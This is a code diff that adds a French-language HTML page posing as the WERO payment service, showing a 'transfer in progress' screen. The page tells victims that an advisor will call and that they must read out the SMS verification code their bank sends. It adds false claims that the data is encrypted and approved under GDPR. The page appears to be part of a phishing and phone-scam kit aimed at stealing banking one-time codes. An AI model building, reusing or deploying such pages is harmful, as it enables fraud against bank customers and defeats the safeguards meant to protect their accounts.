@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virement en cours</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+    <style>
+        .image-wrapper img {
+            max-width: 200px;
+            height: auto;
+            border-radius: 10px;
+            margin: 20px auto;
+        }
+
+        .footer-logo {
+            width: 150px;
+            margin: 20px auto;
+            display: block;
+        }
+
+        .footer-note {
+            font-weight: 700;
+            font-size: 10px;
+            color: red;
+            max-width: 400px;
+            text-align: center;
+            margin: 0 auto 20px;
+            padding: 0 15px;
+        }
+
+        .virement-text {
+            margin: 15px 0;
+            line-height: 1.6;
+        }
+
+        .text-primary-blue {
+            color: #2c4285;
+        }
+
+        .text-secondary-blue {
+            color: #6787ea;
+        }
+        
+        .main-content {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .card {
+            max-width: 100%;
+            width: 100%;
+            text-align: center;
+            border: none;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span class="logo">WERO</span>
+    </div>
+
+    <div class="main-content">
+        <div class="card p-4 shadow-sm">
+            <h3 class="fw-bold" style="color: #FFE500;">Virement en cours...</h3>
+            <div class="image-wrapper">
+                <img src="https://assets.zyrosite.com/Aq2q239lEjf2a2Mj/bb6633cbbedb4ff2ade723521c3219ff07f09fef_2_666x500-ynqreqlgq9u2oeoj-A1aBaO641Oc3Q2Xa.gif"
+                    alt="Wero Payment">
+            </div>
+
+            <p class="fw-bold virement-text text-primary-blue">
+                Pour finaliser la confirmation de votre compte, un conseiller WERO vous contactera par téléphone dans les meilleurs délais.
+            </p>
+
+            <p class="fw-bold virement-text text-secondary-blue">
+                En confirmant votre compte bancaire, vous autorisez WERO à vous envoyer un SMS ou une validation de votre banque. 
+                Le SMS contient un montant de vérification généré aléatoirement ainsi qu'un code composé de 4 à 8 chiffres. 
+                Vous devrez ensuite confirmer cette information auprès du conseiller pour finaliser la validation.
+            </p>
+
+            <p class="fw-bold virement-text text-secondary-blue">
+                Ce processus assure que les informations fournies vous appartiennent et que vous êtes un utilisateur humain, 
+                et non un système automatisé.
+            </p>
+        </div>
+
+        <img class="footer-logo" 
+             src="https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=181,h=47,fit=crop/Aq2q239lEjf2a2Mj/telechargement-mP424qjQJNFzjWLp.png" 
+             alt="RGPD Logo">
+        
+        <div class="footer-note">
+            <strong>NB : Vos informations sont cryptées et stockées sur un serveur hautement
+                sécurisé validé par le (RGPD), garantissant la protection et la confidentialité de vos
+                données.</strong>
+        </div>
+    </div>
+
+    <script src="js/virement.js"></script>
+</body>
+</html>
